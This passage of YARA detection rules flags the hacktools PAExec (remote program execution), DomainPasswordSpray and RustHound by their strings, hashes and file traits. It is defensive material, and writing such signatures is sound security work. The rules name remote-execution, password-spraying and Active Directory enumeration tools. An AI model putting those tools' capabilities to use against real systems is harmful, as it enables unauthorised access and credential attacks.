      id = "ee564534-b921-5639-a7ed-5da79d6bf86a"
   strings:
      $x1 = "Ex: -rlo C:\\Temp\\PAExec.log" fullword ascii
      $x2 = "Can't enumProcesses - Failed to get token for Local System." fullword wide
      $x3 = "PAExec %s - Execute Programs Remotely" fullword wide
      $x4 = "\\\\%s\\pipe\\PAExecIn%s%u" fullword wide
      $x5 = "\\\\.\\pipe\\PAExecIn%s%u" fullword wide
      $x6 = "%%SystemRoot%%\\%s.exe" fullword wide
      $x7 = "in replacement for PsExec, so the command-line usage is identical, with " fullword ascii
      $x8 = "\\\\%s\\ADMIN$\\PAExec_Move%u.dat" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 600KB and 1 of ($x*) ) or ( 3 of them )
}

rule HKTL_DomainPasswordSpray {
   meta:
      description = "Detects the Powershell password spray tool DomainPasswordSpray"
      author = "Arnim Rupp"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      reference = "https://github.com/dafthack/DomainPasswordSpray"
      date = "2023-01-13"
      score = 60
      hash1 = "44d4c0ae5673d2a076f3b5acdc83063aca49d58e6dd7cf73d0b927f83d359247"
      id = "890e4514-2846-54f8-8f32-cc9d2a4ef81b"
   strings:
      $s = "Invoke-DomainPasswordSpray" fullword ascii wide
   condition:
      filesize < 100KB and
      all of them
}

rule HKTL_RustHound {
   meta:
        description = "Detect hacktool RustHound (Sharphound clone)"
        author = "Arnim Rupp (https://github.com/ruppde)"
        date = "2023-03-30"
        reference = "https://github.com/OPENCYBER-FR/RustHound"
        hash = "409f61a34d9771643246f401a9670f6f7dcced9df50cbd89a2e1a5c9ba8d03ab"
        hash = "b1a58a9c94b1df97a243e6c3fc2d04ffd92bc802edc7d8e738573b394be331a9"
        hash = "170f4a48911f3ebef674aade05184ea0a6b1f6b089bcffd658e95b9905423365"
        hash = "e52f6496b863b08296bf602e92a090768e86abf498183aa5b6531a3a2d9c0bdb"
        hash = "847e57a35df29d40858c248e5b278b09cfa89dd4201cb24262c6158395e2e585"
        hash = "4edfed92b54d32a58b2cfc926f98a56637e89850410706abcc469a8bc846bc85"
        hash = "feba0c16830ea0a13819a9ab8a221cc64d5a9b3cc73f3c66c405a171a2069cc1"
        hash = "21d37c2393a6f748fe34c9d2f52693cb081b63c3a02ca0bebe4a584076f5886c"
        hash = "874a1a186eb5808d456ce86295cd5f09d6c819375acb100573c2103608af0d84"
        hash = "bf576bd229393010b2bb4ba17e49604109e294ca38cf19647fc7d9c325f7bcd1"
        id = "d2fd79a5-9a1a-51de-920c-61653c8b0064"
   strings:
        $rh1 = "rusthound" fullword ascii wide
        $rh2 = "Making json/zip files finished!" ascii wide
   condition:
        (
            // PE or elf
            uint16(0) == 0x5A4D or
            uint16(0) == 0x457f
        ) and
        1 of ( $rh* )
}

